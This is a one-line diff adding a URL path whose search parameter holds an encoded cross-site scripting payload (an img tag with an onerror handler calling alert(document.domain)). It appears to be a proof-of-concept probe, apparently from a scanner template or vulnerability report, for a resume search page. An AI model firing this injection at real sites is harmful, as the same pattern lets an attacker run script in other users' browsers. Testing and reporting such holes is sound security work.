@@ -1,0 +1,1 @@
+/resumes/?s=%22%3E%3Cimg+src%3Dx+onerror%3Dalert(document.domain)%3E
